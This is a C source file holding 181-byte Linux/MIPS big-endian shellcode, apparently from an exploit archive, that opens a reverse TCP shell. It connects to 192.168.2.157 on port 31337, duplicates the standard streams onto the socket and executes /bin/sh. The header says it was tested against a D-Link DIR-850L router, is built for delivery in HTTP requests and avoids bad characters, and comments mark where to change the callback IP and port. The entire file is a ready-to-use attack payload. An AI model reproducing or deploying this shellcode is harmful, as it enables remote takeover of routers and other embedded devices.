/*
 # Linux/MIPS (Big Endian) - execve(/bin/sh) + Reverse TCP 192.168.2.157/31337 Shellcode (181 bytes)
 # Author: cq674350529
 # Date: 2018-10-07
 #  - execve('/bin/sh'), tcp - 192.168.2.157/31337
 #  - used in HTTP Request
 #  - tested on D-Link dir-850l router, avoid bad chars ('\x00', '\x20', '\x23', '\x0d\x0a')
 #  - based on rigan's shellcode and metasploit's shellcode, no encoder used
 */

#include <stdio.h>

unsigned char sc[] =
            "\x24\x0f\xff\xfa"      // li      $t7, -6
            "\x01\xe0\x78\x27"      // nor     $t7, $zero
            "\x21\xe4\xff\xfd"      // addi    $a0, $t7, -3
            "\x21\xe5\xff\xfd"      // addi    $a1, $t7, -3
            "\x28\x06\xff\xff"      // slti    $a2, $zero, -1
            "\x24\x02\x10\x57"      // li      $v0, 4183 ( sys_socket )
            "\x01\x01\x01\x0c"      // syscall 0x40404
            "\xaf\xa2\xff\xff"      // sw      $v0, -1($sp)
            "\x8f\xa4\xff\xff"      // lw      $a0, -1($sp)
            "\x34\x0f\xff\xfd"      // li      $t7, -3 ( sa_family = AF_INET )
            "\x01\xe0\x78\x27"      // nor     $t7, $zero
            "\xaf\xaf\xff\xe0"      // sw      $t7, -0x20($sp)

            /* ================ You can change port here  ================= */
            "\x3c\x0e\x7a\x69"      // lui     $t6, 0x7a69 ( sin_port = 0x7a69 )
            /* ============================================================ */

            "\x35\xce\x7a\x69"      // ori     $t6, $t6, 0x7a69
            "\xaf\xae\xff\xe4"      // sw      $t6, -0x1c($sp)

            /* ================ You can change ip here  ================= */
            "\x3c\x0e\xc0\xa8"      // lui     $t6, 0xc0a8         ( sin_addr = 0xc0a8 ...
            "\x35\xce\x02\x9d"      // ori     $t6, $t6, 0x029d                 ... 0x029d
            /* ============================================================ */

            "\xaf\xae\xff\xe6"      // sw      $t6, -0x1a($sp)
            "\x27\xa5\xff\xe2"      // addiu   $a1, $sp, -0x1e
            "\x24\x0c\xff\xef"      // li      $t4, -17  ( addrlen = 16 )
            "\x01\x80\x30\x27"      // nor     $a2, $t4, $zero
            "\x24\x02\x10\x4a"      // li      $v0, 4170 ( sys_connect )
            "\x01\x01\x01\x0c"      // syscall 0x40404
            "\x24\x0f\xff\xfd"      // li      t7,-3
            "\x01\xe0\x28\x27"      // nor     a1,t7,zero
            "\x8f\xa4\xff\xff"      // lw      $a0, -1($sp)
            // dup2_loop:
            "\x24\x02\x0f\xdf"      // li      $v0, 4063 ( sys_dup2 )
            "\x01\x01\x01\x0c"      // syscall 0x40404
            "\x24\xa5\xff\xff"      // addi    a1,a1,-1 (\x20\xa5\xff\xff)
            "\x24\x01\xff\xff"      // li      at,-1
            "\x14\xa1\xff\xfb"      // bne     a1,at, dup2_loop
            "\x28\x06\xff\xff"      // slti    $a2, $zero, -1
            "\x3c\x0f\x2f\x2f"      // lui     $t7, 0x2f2f
            "\x35\xef\x62\x69"      // ori     $t7, $t7, 0x6269
            "\xaf\xaf\xff\xec"      // sw      $t7, -0x14($sp)
            "\x3c\x0e\x6e\x2f"      // lui     $t6, 0x6e2f
            "\x35\xce\x73\x68"      // ori     $t6, $t6, 0x7368
            "\xaf\xae\xff\xf0"      // sw      $t6, -0x10($sp)
            "\xaf\xa0\xff\xf4"      // sw      $zero, -0xc($sp)
            "\x27\xa4\xff\xec"      // addiu   $a0, $sp, -0x14
            "\xaf\xa4\xff\xf8"      // sw      $a0, -8($sp)
            "\xaf\xa0\xff\xfc"      // sw      $zero, -4($sp)
            "\x27\xa5\xff\xf8"      // addiu   $a1, $sp, -8
            "\x24\x02\x0f\xab"      // li      $v0, 4011 (sys_execve)
            "\x01\x01\x01\x0c";     // syscall 0x40404

void main(void)
{
    void(*s)(void);
    printf("size: %d\n", sizeof(sc));
    s = sc;
    s();
}